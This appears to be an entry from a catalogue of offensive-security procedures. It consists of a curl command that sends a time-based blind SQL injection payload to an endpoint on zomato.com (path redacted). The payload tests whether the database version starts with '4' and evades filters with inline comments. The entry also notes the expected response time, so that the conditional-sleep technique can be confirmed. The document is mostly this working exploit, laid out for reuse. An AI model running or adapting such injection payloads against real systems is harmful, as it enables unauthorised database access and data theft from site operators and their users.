---
data: >-
  curl -X POST "https://www.zomato.com/php/██████████" -d
  "res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111"
tags:
  - sqli
  - control-test
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.219Z'
id: 65242a96-65fa-476e-8a46-ba8a8596befb
verified: false
validated: true
submitted: true
---
# zomato-sqli-version-check-4

## Command

```bash
curl -X POST "https://www.zomato.com/php/██████████" \
  -d "res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111"
```

## Description

Control payload checking if version starts with '4' to validate conditional logic via quick response.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Similar to check-5 | Adjusted condition | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

~910ms response (false condition).

## Related

- [[Related Procedure: Extract-Database-Version-Using-Conditional-Sleep-Payload]]
